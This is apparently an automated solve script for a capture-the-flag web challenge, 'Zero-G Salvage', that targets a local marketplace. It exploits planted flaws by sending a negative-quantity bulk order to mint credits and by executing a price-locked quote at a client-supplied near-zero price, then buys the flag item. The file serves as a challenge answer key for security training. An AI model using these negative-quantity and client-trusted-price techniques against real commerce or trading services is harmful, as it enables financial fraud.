// Zero-G Salvage - automated end-to-end solve.
//
// Usage: node solve.js [baseUrl] [sessionCookie]
//   baseUrl        defaults to http://localhost:8080 (the public entrypoint;
//                  nginx proxies /api/* to the internal backend)
//   sessionCookie  optional - reuse an existing session (e.g. your browser's)
//                  instead of creating a fresh one, so you can watch the
//                  balance update live in the UI while this runs. Grab the
//                  value from DevTools -> Application/Storage -> Cookies for
//                  "zgs_session". Either the raw value or the full "zgs_session=<value>"
//                  pair is accepted. You can also set it via the
//                  SESSION_COOKIE env var instead of a CLI argument.
//
// Chains two independent, individually-capped bugs (a sign-validation gap in
// the Bulk Order Discount Program, and a client-trusted price on Quote Lock
// execution) on top of the ordinary signup voucher and liquidating the
// starter holdings, then purchases the Flux Capacitor listing and prints the
// flag. Each bug maxes out its ceiling in a single request - no grinding, no
// stopping heuristics. Starting credits + voucher + holdings + either bug
// alone falls short of the 30,000 cr price; both bugs are required.

const BASE_URL = process.argv[2] || 'http://localhost:8080';
const SESSION_COOKIE_NAME = 'zgs_session';

const suppliedCookie = process.argv[3] || process.env.SESSION_COOKIE || '';
let cookie = suppliedCookie
	? suppliedCookie.includes('=')
		? suppliedCookie
		: `${SESSION_COOKIE_NAME}=${suppliedCookie}`
	: '';

async function api(path, opts = {}) {
	const res = await fetch(`${BASE_URL}${path}`, {
		...opts,
		headers: { 'Content-Type': 'application/json', ...(cookie ? { Cookie: cookie } : {}) },
	});
	const setCookie = res.headers.get('set-cookie');
	if (setCookie) cookie = setCookie.split(';')[0];

	const text = await res.text();
	let data;
	try {
		data = JSON.parse(text);
	} catch {
		// Plain-text body = express-rate-limit (trades are capped at 5/s per
		// session). Back off and retry. The Bulk Order lockout also uses 429,
		// but with a JSON body, so it's never retried here.
		if (res.status === 429) {
			await new Promise((resolve) => setTimeout(resolve, 1000));
			return api(path, opts);
		}
		data = { error: text };
	}
	return { ok: res.ok, status: res.status, data };
}

function get(path) {
	return api(path);
}
function post(path, body) {
	return api(path, { method: 'POST', body: body !== undefined ? JSON.stringify(body) : undefined });
}

async function getAccount() {
	const { data } = await get('/api/account');
	return data;
}

// --- Step 1: signup voucher (ordinary, single-use, no exploit) -------------

async function redeemVoucher() {
	console.log('\n[1/4] Redeeming signup voucher');
	const { data } = await post('/api/voucher/redeem');
	if (data.error) throw new Error(`Voucher redemption failed: ${data.error}`);
	console.log(`  +${data.granted} credits (credits now ${data.credits})`);
}

// --- Step 2: Bulk Order Discount Program - negative-quantity exploit -------
//
// POST /api/trade/bulk-buy prices orders as
//   cost = qty * pricePerTon * (1 - discountRate(qty))
// with no server-side check that qty is positive or meets the advertised
// 500-ton minimum (that's only enforced by the trading terminal's UI). A
// large negative qty makes `cost` deeply negative, so `credits -= cost` adds
// credits instead of spending them. The server clamps the payout to
// BULK_ORDER_PROFIT_CAP and then locks the program for the account - one
// request is enough to hit the ceiling.
//
// Run against COPR, which we hold none of: the order leaves that ticker's
// holdings deeply negative, so aiming it at STEEL or IRON would block us
// from selling the starter cargo afterwards.

async function bulkOrderExploit() {
	console.log('\n[2/4] Bulk Order Discount Program (negative-quantity exploit)');
	const { data } = await post('/api/trade/bulk-buy', { ticker: 'COPR', qty: -100000 });
	if (data.error) throw new Error(`Bulk order exploit failed: ${data.error}`);
	console.log(`  cost ${data.cost} (credits now ${data.credits})`);

	// Confirm the lockdown as sanity check
	const followUp = await post('/api/trade/bulk-buy', { ticker: 'COPR', qty: -1 });
	console.log(`  follow-up call status ${followUp.status}: ${followUp.data.error ?? 'unexpectedly succeeded'}`);
}

// --- Step 3: Quote Lock - client-trusted price exploit ----------------------
//
// POST /api/quote/lock records { ticker, qty, price } server-side and returns
// a quoteId. POST /api/quote/execute reads qty/ticker from that stored quote
// (trusted) but takes the settlement price straight from the request body
// instead of the price the quote actually locked in. The server still charges
// `fairCost - cappedGain`, not the tampered price outright - so the profit
// comes out as underpriced *inventory*, not direct credits. Lock a quantity
// whose fair value is comfortably above the cap (so the capped gain is close
// to the full fair value, keeping the out-of-pocket cost small) and execute
// at a near-zero price, then sell the acquired lot back at the index to
// realize the capped profit as credits (the 2% clearing fee on the sale
// trims it to roughly 7,800 net).

async function quoteLockExploit() {
	console.log('\n[3/4] Quote Lock (client-trusted price exploit)');
	const qty = 50; // fair value (~9,000 cr for STEEL) comfortably clears the 8,000 cap
	const lockRes = await post('/api/quote/lock', { ticker: 'STEEL', qty });
	if (lockRes.data.error) throw new Error(`Quote lock failed: ${lockRes.data.error}`);
	console.log(`  locked ${lockRes.data.qty}t of ${lockRes.data.ticker} at ${lockRes.data.price} cr/t`);

	const execRes = await post('/api/quote/execute', { quoteId: lockRes.data.quoteId, price: 0.01 });
	if (execRes.data.error) throw new Error(`Quote execute failed: ${execRes.data.error}`);
	console.log(`  executed for ${execRes.data.cost} cr (credits now ${execRes.data.credits}, holdings +${qty}t STEEL)`);

	const sellRes = await post('/api/trade/sell', { ticker: 'STEEL', qty });
	if (sellRes.data.error) throw new Error(`Realizing quote-lock profit failed: ${sellRes.data.error}`);
	console.log(`  sold the ${qty}t lot back at the index for ${sellRes.data.proceeds} cr after a ${sellRes.data.fee} cr clearing fee (credits now ${sellRes.data.credits})`);
}

// --- Step 4: liquidate the starter holdings ---------------------------------
//
// The account starts with some STEEL and IRON in the hold (~10,700 cr at
// reference prices, ~10,490 after the 2% clearing fee). Selling it is
// ordinary trading, but the credits are part
// of the budget - the price is set so that everything except one of the two
// bugs still isn't enough.

async function liquidateHoldings() {
	console.log('\n[4/4] Selling starter holdings');
	const { holdings } = await getAccount();
	for (const [ticker, held] of Object.entries(holdings)) {
		if (!(held > 0)) continue;
		const { data } = await post('/api/trade/sell', { ticker, qty: held });
		if (data.error) throw new Error(`Selling ${ticker} failed: ${data.error}`);
		console.log(`  sold ${held}t ${ticker} for ${data.proceeds} cr (credits now ${data.credits})`);
	}
}

// --- Final: purchase the Flux Capacitor -------------------------------------

async function purchaseFluxCapacitor() {
	console.log('\nPurchasing the Flux Capacitor listing...');
	const { data: listings } = await get('/api/listings');
	const item = listings.find((l) => /temporal|flux/i.test(l.title));
	if (!item) throw new Error('Could not find the Flux Capacitor listing');
	const { data } = await post(`/api/listings/${item.id}/purchase`);
	if (!data.purchased) {
		throw new Error(`Purchase failed: ${data.error} (credits so far were not enough)`);
	}
	console.log(`  purchased ${data.item}`);
	console.log(`\nFLAG: ${data.flag}`);
	return data.flag;
}

async function main() {
	console.log('Zero-G Salvage - automated solve against', BASE_URL);
	if (suppliedCookie) console.log('Reusing supplied session cookie:', cookie);
	console.log('starting account:', await getAccount());

	await redeemVoucher();
	await bulkOrderExploit();
	await quoteLockExploit();
	await liquidateHoldings();

	console.log('\nfinal account:', await getAccount());

	const flag = await purchaseFluxCapacitor();
	if (!flag) process.exit(1);
}

main().catch((err) => {
	console.error('solve failed:', err);
	process.exit(1);
});
